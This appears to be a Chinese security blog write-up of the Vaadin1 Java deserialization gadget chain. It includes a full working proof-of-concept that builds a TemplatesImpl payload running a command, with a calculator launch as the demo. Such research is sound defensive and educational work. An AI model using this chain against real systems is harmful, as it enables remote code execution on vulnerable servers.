# Java-Vaadin1

  
  
&lt;!--more--&gt;  
## 0x01 前言  
```xml  
  &lt;dependencies&gt;  
    &lt;dependency&gt;  
      &lt;groupId&gt;com.vaadin&lt;/groupId&gt;  
      &lt;artifactId&gt;vaadin-server&lt;/artifactId&gt;  
      &lt;version&gt;7.7.14&lt;/version&gt;  
    &lt;/dependency&gt;  
  
    &lt;dependency&gt;  
      &lt;groupId&gt;com.vaadin&lt;/groupId&gt;  
      &lt;artifactId&gt;vaadin-shared&lt;/artifactId&gt;  
      &lt;version&gt;7.7.14&lt;/version&gt;  
    &lt;/dependency&gt;  
    &lt;dependency&gt;  
      &lt;groupId&gt;org.javassist&lt;/groupId&gt;  
      &lt;artifactId&gt;javassist&lt;/artifactId&gt;  
      &lt;version&gt;3.29.0-GA&lt;/version&gt;  
    &lt;/dependency&gt;  
  &lt;/dependencies&gt;  
```  
Vaadin 是一个在 Java 后端快速开发 web 应用程序的平台。用 Java 构建可伸缩的 UI，并使用集成的工具、组件和设计系统来更快地迭代、更好地设计和简化开发过程。  
## 0x02 前置知识  
NestedMethodProperty  
`com.vaadin.data.util.NestedMethodProperty`类是一个封装访问属性方法的类。构造方法接收两个参数，一个是对象实例，一个是属性值。初始化时调用 initialize方法获取实例类中的相关信息存放在成员变量中。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411170120780.png)
等到调用`NestedMethodProperty`的`getValue`方法时，就会反射调用封装对象指定属性的`getter`方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411170121719.png)
因此这个类又是可以触发 TemplaesImpl 的利用方式  
PropertysetItem  
触发类`com.vaadin.data.util.PropertysetItem`，这个类用来存储Property属性值，为其映射一个 id 对象。  
数据存放在成员变量 map 中，想要获取相应属性的时，则调用`getItemProperty`方法在 map 中获取。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411170125544.png)
映射的 id 对象则存储在成员变量 list 中。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411170126054.png)
`PropertysetItem`的`toString`方法，获取全部 id 对象并遍历，使用`getItemProperty`方法获取映射的`Property`属性对象，并调用其`getValue`方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411170128112.png)
使用`PropertysetItem`的`toString`方法触发`NestedMethodProperty`的`getValue`方法。  
触发点选择`BadAttributeValueExpException`中的`readObject`方法  
构造`exp`  
```java  
import com.vaadin.data.util.NestedMethodProperty;    
import com.vaadin.data.util.PropertysetItem;    
import javassist.CannotCompileException;    
import javassist.ClassPool;    
import javassist.CtClass;    
import javassist.NotFoundException;    
    
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;    
import javax.management.BadAttributeValueExpException;    
import java.io.*;    
import java.lang.reflect.Field;    
import java.util.Base64;    
import java.util.UUID;    
    
public class Poc {    
    public static void main(String[] args) throws Exception {    
        byte[] code = getTemplates();    
        byte[][] codes = {code};    
        // TemplatesImpl    
        TemplatesImpl templates = new TemplatesImpl();    
        setFieldValue(templates, &#34;_name&#34;, &#34;useless&#34;);    
        setFieldValue(templates, &#34;_tfactory&#34;, null);    
        setFieldValue(templates, &#34;_bytecodes&#34;, codes);    
        NestedMethodProperty&lt;Object&gt; nestedMethodProperty = new NestedMethodProperty(templates,&#34;outputProperties&#34;);    
        PropertysetItem propertysetItem = new PropertysetItem();    
        propertysetItem.addItemProperty(&#34;outputProperties&#34;, nestedMethodProperty);    
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);    
        setFieldValue(badAttributeValueExpException,&#34;val&#34;,propertysetItem);    
        String payload = serialize(badAttributeValueExpException);    
        unserialize(payload);    
    }    
    
    public static void unserialize(String base) throws IOException, ClassNotFoundException {    
        byte[] result = Base64.getDecoder().decode(base);    
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(result);    
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);    
        objectInputStream.readObject();    
    }    
    
    public static String serialize(Object object) throws IOException {    
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();    
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);    
        objectOutputStream.writeObject(object);    
        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());    
    }    
    
    public static byte[] getTemplates() throws CannotCompileException, IOException, NotFoundException {    
        ClassPool classPool = ClassPool.getDefault();    
        // 生成一个随机的类名    
        String randomClassName = &#34;Test_&#34; &#43; UUID.randomUUID().toString().replace(&#34;-&#34;, &#34;&#34;);    
        CtClass ctClass = classPool.makeClass(randomClassName);    
        ctClass.setSuperclass(classPool.get(&#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&#34;));    
        String block = &#34;Runtime.getRuntime().exec(\&#34;open -a Calculator\&#34;);&#34;;    
        ctClass.makeClassInitializer().insertBefore(block);    
        return ctClass.toBytecode();    
    }    
    
    public static void setFieldValue(Object object, String field, Object arg) throws NoSuchFieldException, IllegalAccessException {    
        Field f = object.getClass().getDeclaredField(field);    
        f.setAccessible(true);    
        f.set(object, arg);    
    }    
    
}  
```  

---

> Author: N1Rvana  
> URL: http://localhost:1313/java-vaadin1/  

